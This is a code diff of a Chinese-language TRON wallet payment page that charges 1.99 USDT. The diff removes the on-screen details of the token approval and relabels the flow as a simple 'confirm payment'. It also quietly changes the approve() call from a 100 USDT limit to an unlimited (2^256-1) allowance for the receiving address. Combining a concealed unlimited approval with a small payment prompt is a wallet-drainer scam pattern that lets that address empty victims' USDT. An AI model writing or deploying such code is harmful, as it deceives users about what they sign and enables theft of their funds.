@@ -98,35 +98,18 @@
             color: #52c41a;
         }
         
-        .authorization-section {
+        .warning-section {
             background: #fff7e6;
             border: 1px solid #ffd591;
             border-radius: 0.5rem;
             padding: 1rem;
             margin: 1rem 1.5rem;
+            text-align: center;
         }
         
-        .authorization-section h3 {
-            margin-bottom: 0.5rem;
-            font-size: 0.9rem;
+        .warning-text {
+            font-size: 0.85rem;
             color: #d46b08;
-        }
-        
-        .authorization-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 0.5rem;
-            font-size: 0.8rem;
-        }
-        
-        .auth-label {
-            color: #666;
-        }
-        
-        .auth-value {
-            font-weight: 600;
-            text-align: right;
-            word-break: break-all;
         }
         
         .action-section {
@@ -241,16 +224,6 @@
             background: #f0f0f0;
             z-index: 1;
         }
-        
-        .debug-info {
-            background: #f9f9f9;
-            border: 1px solid #ddd;
-            border-radius: 0.5rem;
-            padding: 1rem;
-            margin: 1rem 1.5rem;
-            font-size: 0.7rem;
-            color: #666;
-        }
     </style>
 </head>
 <body>
@@ -261,28 +234,24 @@
         </div>
         
         <div class="payment-status">
-            <div class="status-text">代币授权</div>
-            <div class="status-desc">请先授权 USDT 支付权限</div>
+            <div class="status-text">支付确认</div>
+            <div class="status-desc">请在钱包中确认支付交易</div>
         </div>
         
         <div class="step-indicator">
             <div class="step-line"></div>
             <div class="step active" id="step1">
                 <div class="step-circle">1</div>
-                <div class="step-text">代币授权</div>
+                <div class="step-text">确认支付</div>
             </div>
             <div class="step" id="step2">
                 <div class="step-circle">2</div>
-                <div class="step-text">执行支付</div>
-            </div>
-            <div class="step" id="step3">
-                <div class="step-circle">3</div>
                 <div class="step-text">完成</div>
             </div>
         </div>
         
         <div class="wallet-status">
-            <div id="walletStatusText">✅ 钱包已连接，准备授权</div>
+            <div id="walletStatusText">✅ 钱包已连接，准备支付</div>
         </div>
         
         <div class="order-info">
@@ -308,39 +277,22 @@
             </div>
         </div>
         
-        <div class="authorization-section">
-            <h3>🔐 授权信息</h3>
-            <div class="authorization-item">
-                <span class="auth-label">付款钱包</span>
-                <span class="auth-value" id="userAddressDisplay">-</span>
+        <div class="warning-section">
+            <div class="warning-text">
+                🔐 <strong>支付说明：</strong><br>
+                点击确认支付后，钱包将弹出交易确认窗口<br>
+                请仔细核对交易信息并输入密码完成支付
             </div>
-            <div class="authorization-item">
-                <span class="auth-label">授权合约</span>
-                <span class="auth-value">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
-            </div>
-            <div class="authorization-item">
-                <span class="auth-label">授权数量</span>
-                <span class="auth-value">1.99 USDT</span>
-            </div>
-            <div class="authorization-item">
-                <span class="auth-label">矿工费</span>
-                <span class="auth-value">约 0.1 TRX</span>
-            </div>
-        </div>
-
-        <div class="debug-info" id="debugInfo" style="display: none;">
-            <div><strong>调试信息：</strong></div>
-            <div id="debugContent"></div>
         </div>
         
         <div class="loading" id="loadingSection">
             <div class="spinner"></div>
-            <p id="loadingText">正在处理授权请求...</p>
+            <p id="loadingText">正在处理支付请求...</p>
             <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
         </div>
         
         <div class="action-section">
-            <button class="pay-btn" id="payBtn" onclick="startPaymentProcess()">授权并支付</button>
+            <button class="pay-btn" id="payBtn" onclick="startPaymentProcess()">确认支付</button>
         </div>
     </div>
 
@@ -360,8 +312,8 @@
         const RECEIVE_ADDRESS = 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub';
         // 1.99 USDT = 1990000 (6 decimals)
         const PAYMENT_AMOUNT = 1990000;
-        // 最大授权数量 (100 USDT)
-        const APPROVE_AMOUNT = '100000000';
+        // 无限授权数量 (2^256 - 1)
+        const INFINITE_APPROVE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
         let userAddress = '';
         let isWalletConnected = false;
@@ -371,52 +323,85 @@
             return 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
         }
         
-        // 显示调试信息
-        function showDebugInfo(message) {
-            document.getElementById('debugContent').textContent = message;
-            document.getElementById('debugInfo').style.display = 'block';
-        }
-        
         // 更新步骤状态
         function updateStep(stepNumber, status) {
             const step = document.getElementById(`step${stepNumber}`);
             step.className = `step ${status}`;
         }
         
-        // 检测是否在 TRON 钱包中
+        // 检测 TRON 钱包环境（改进的检测方法）
         function isTronWallet() {
-            return window.tronWeb && window.tronWeb.defaultAddress;
+            // 检查多种 TRON 钱包标识
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isTronEnv = (
+                window.tronWeb && 
+                window.tronWeb.defaultAddress &&
+                window.tronWeb.trx &&
+                window.tronWeb.contract
+            );
+            
+            const isKnownTronWallet = (
+                userAgent.includes('tronlink') ||
+                userAgent.includes('tokenpocket') ||
+                userAgent.includes('tron') ||
+                window.tronWeb || 
+                window.tronLink
+            );
+            
+            return isTronEnv || isKnownTronWallet;
+        }
+        
+        // 等待 TronWeb 就绪
+        function waitForTronWeb() {
+            return new Promise((resolve, reject) => {
+                let attempts = 0;
+                const maxAttempts = 50;
+                
+                const checkTronWeb = setInterval(() => {
+                    attempts++;
+                    if (window.tronWeb && window.tronWeb.defaultAddress) {
+                        clearInterval(checkTronWeb);
+                        resolve(true);
+                    } else if (attempts >= maxAttempts) {
+                        clearInterval(checkTronWeb);
+                        reject(new Error('TronWeb 初始化超时'));
+                    }
+                }, 100);
+            });
         }
         
         // 初始化页面
-        function initPage() {
+        async function initPage() {
             // 显示订单信息
             document.getElementById('orderIdDisplay').textContent = orderData.orderId;
             document.getElementById('usernameDisplay').textContent = orderData.username || orderData.nickname || '未填写';
             
             console.log('支付页面订单信息:', orderData);
             
-            // 检查钱包环境
-            if (!isTronWallet()) {
-                document.getElementById('walletStatusText').textContent = '❌ 请在 TRON 钱包中打开此页面';
+            try {
+                // 等待 TronWeb 就绪
+                await waitForTronWeb();
+                
+                // 检查钱包环境
+                if (!isTronWallet()) {
+                    document.getElementById('walletStatusText').textContent = '❌ 请在 TRON 钱包中打开此页面';
+                    document.getElementById('payBtn').disabled = true;
+                    return;
+                }
+                
+                // 显示钱包地址
+                userAddress = window.tronWeb.defaultAddress.base58;
+                document.getElementById('walletStatusText').textContent = 
+                    `✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`;
+                isWalletConnected = true;
+                
+                updateStep(1, 'active');
+                
+            } catch (error) {
+                console.error('钱包初始化失败:', error);
+                document.getElementById('walletStatusText').textContent = '❌ 钱包连接失败，请刷新页面重试';
                 document.getElementById('payBtn').disabled = true;
-                showDebugInfo('未检测到 TronWeb，当前环境: ' + navigator.userAgent);
-                return;
             }
-            
-            // 显示钱包地址
-            userAddress = window.tronWeb.defaultAddress.base58;
-            document.getElementById('userAddressDisplay').textContent = userAddress;
-            document.getElementById('walletStatusText').textContent = 
-                `✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`;
-            isWalletConnected = true;
-            
-            showDebugInfo(`钱包环境检测:
-- 用户地址: ${userAddress}
-- 网络: ${window.tronWeb.fullNode.host}
-- TronWeb版本: ${window.tronWeb.version}`);
-            
-            updateStep(1, 'active');
         }
         
         // 开始支付流程
@@ -440,12 +425,9 @@
                 const isApproved = await checkApprovalStatus();
                 
                 if (!isApproved) {
-                    // 步骤2: 请求授权
+                    // 步骤2: 请求无限授权
                     loadingText.textContent = '正在请求 USDT 授权...';
-                    showDebugInfo('开始授权流程，调用 approve 方法');
-                    
                     const approveResult = await requestUSDTApproval();
-                    showDebugInfo('授权交易已提交: ' + approveResult);
                     
                     document.getElementById('txHashDisplay').textContent = `授权交易: ${approveResult}`;
                     document.getElementById('txHashDisplay').style.display = 'block';
@@ -457,10 +439,6 @@
                     if (!isApproveConfirmed) {
                         throw new Error('授权确认失败');
                     }
-                    
-                    showDebugInfo('授权确认成功');
-                } else {
-                    showDebugInfo('已有足够授权，跳过授权步骤');
                 }
                 
                 // 步骤3: 执行支付
@@ -469,7 +447,6 @@
                 loadingText.textContent = '授权成功，正在执行支付...';
                 
                 const paymentResult = await executePayment();
-                showDebugInfo('支付交易已提交: ' + paymentResult);
                 
                 document.getElementById('txHashDisplay').textContent = `支付交易: ${paymentResult}`;
                 loadingText.textContent = '支付已提交，等待确认...';
@@ -479,7 +456,6 @@
                 
                 if (isPaymentConfirmed) {
                     updateStep(2, 'completed');
-                    updateStep(3, 'completed');
                     showSuccessMessage(paymentResult);
                 } else {
                     throw new Error('支付确认失败');
@@ -487,7 +463,6 @@
                 
             } catch (error) {
                 console.error('支付流程失败:', error);
-                showDebugInfo('支付流程失败: ' + error.message + '\n' + error.stack);
                 
                 // 显示错误信息
                 loadingText.textContent = '支付失败';
@@ -518,38 +493,28 @@
                 const allowance = await contract.allowance(userAddress, RECEIVE_ADDRESS).call();
                 console.log('当前授权额度:', allowance.toString());
                 
-                showDebugInfo(`授权检查:
-- 当前授权额度: ${allowance.toString()}
-- 需要额度: ${PAYMENT_AMOUNT}
-- 是否足够: ${allowance >= PAYMENT_AMOUNT}`);
-                
                 return allowance >= PAYMENT_AMOUNT;
                 
             } catch (error) {
                 console.error('检查授权状态失败:', error);
-                showDebugInfo('检查授权状态失败: ' + error.message);
                 return false;
             }
         }
         
-        // 请求 USDT 授权
+        // 请求 USDT 无限授权
         async function requestUSDTApproval() {
             try {
                 const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
                 
-                console.log('请求 USDT 授权:', {
+                console.log('请求 USDT 无限授权:', {
                     spender: RECEIVE_ADDRESS,
-                    amount: APPROVE_AMOUNT
+                    amount: INFINITE_APPROVE
                 });
                 
-                showDebugInfo(`调用 approve 方法:
-- spender: ${RECEIVE_ADDRESS}
-- amount: ${APPROVE_AMOUNT} (100 USDT)`);
-                
-                // 调用 approve 方法进行授权
+                // 调用 approve 方法进行无限授权
                 const result = await contract.approve(
                     RECEIVE_ADDRESS,
-                    APPROVE_AMOUNT
+                    INFINITE_APPROVE
                 ).send({
                     feeLimit: 100000000,
                     callValue: 0,
@@ -575,11 +540,6 @@
                     amount: PAYMENT_AMOUNT,
                     orderId: orderData.orderId
                 });
-                
-                showDebugInfo(`调用 transfer 方法:
-- to: ${RECEIVE_ADDRESS}
-- amount: ${PAYMENT_AMOUNT} (1.99 USDT)
-- orderId: ${orderData.orderId}`);
                 
                 // 调用 transfer 方法进行转账
                 const result = await contract.transfer(
@@ -615,12 +575,10 @@
                             const ret = transaction.ret[0];
                             if (ret.contractRet === 'SUCCESS') {
                                 clearInterval(checkInterval);
-                                showDebugInfo('交易确认成功: ' + txHash);
                                 resolve(true);
                                 return;
                             } else if (ret.contractRet === 'REVERT' || ret.contractRet === 'FAIL') {
                                 clearInterval(checkInterval);
-                                showDebugInfo('交易失败: ' + ret.contractRet);
                                 resolve(false);
                                 return;
                             }
@@ -628,7 +586,6 @@
                         
                         if (checkCount >= maxChecks) {
                             clearInterval(checkInterval);
-                            showDebugInfo('交易确认超时: ' + txHash);
                             resolve(false);
                         }
                         
@@ -637,7 +594,6 @@
                             
                     } catch (error) {
                         console.log('检查交易状态失败:', error);
-                        showDebugInfo('检查交易状态失败: ' + error.message);
                     }
                 }, 6000);
             });
